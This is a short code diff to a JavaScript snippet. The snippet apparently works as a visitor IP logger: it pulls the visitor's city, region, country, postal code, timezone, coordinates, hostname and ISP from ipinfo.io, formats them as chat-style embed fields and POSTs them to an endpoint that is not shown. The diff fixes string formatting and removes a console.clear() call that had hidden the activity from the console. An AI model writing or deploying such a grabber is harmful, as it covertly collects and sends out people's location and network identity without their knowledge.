@@ -14,11 +14,11 @@ $.getJSON("https://ipinfo.io/json", function(data) {
           },
           {
             "name": "GeoLocation Info",
-            "value": `>>> Town, State: ${data.city}, ${data.region}"\n"Country: ${data.country}"\n"Postal Code: ${data.postal}"\n"TimeZone: ${(data.timezone).replace('_', ' ')}"\n"Long/Lat: ${data.loc}`
+            "value": `>>> Town, State: ${data.city}, ${data.region}\nCountry: ${data.country}\nPostal Code: ${data.postal}\nTimeZone: ${(data.timezone).replace('_', ' ')}\nLong/Lat: ${data.loc}`
           },
           {
             "name": "Network Info",
-            "value": `>>> HostName: ${data.hostname}"\n"ISP: ${data.org}"\n"`
+            "value": `>>> HostName: ${data.hostname}\nISP: ${data.org}\n`
           }
         ]
       }
@@ -32,6 +32,5 @@ $.getJSON("https://ipinfo.io/json", function(data) {
     body: JSON.stringify(params)
   }).then(res => {
     console.log("hi");
-console.clear();
   }) 
 })
